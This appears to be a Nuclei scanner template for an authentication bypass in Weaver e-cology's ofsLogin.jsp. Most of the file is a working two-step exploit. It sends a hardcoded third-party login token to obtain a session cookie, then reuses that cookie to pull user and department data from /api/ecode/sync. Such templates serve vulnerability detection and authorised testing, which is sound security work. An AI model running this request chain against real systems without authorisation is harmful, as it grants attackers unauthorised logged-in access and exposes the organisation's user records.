id: weaver-ecology-login-bypass
info:
  name: Weaver e-cology ofsLogin.jsp User Login Bypass
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The Weaver e-cology platform has a privilege bypass vulnerability that allows attackers to log in without proper authorization.
  reference:
    - https://www.weaver.com.cn/cs/securityDownload.html?src=cn
  classification:
    cvss-score: 9.3
  tags: permission-bypass

variables:
  loginToken: "866fb3887a60239fc112354ee7ffc168"

http:
  - raw:
      - |
        GET /mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=1&loginTokenFromThird={{loginToken}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
        Accept: */*
    stop-at-first-match: true
    extractors:
      - type: regex
        name: cookie
        part: header
        internal: true
        regex:
          - "Set-Cookie: ([^;]+);"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "location.replace('/wui/index.html');"

  - raw:
      - |
        GET /api/ecode/sync HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.5
        Referer: {{BaseURL}}/mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=1&loginTokenFromThird={{loginToken}}
        Cookie: {{cookie}}
        Upgrade-Insecure-Requests: 1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"_user\":"
          - "departmentName"
          - "subCompanyId"
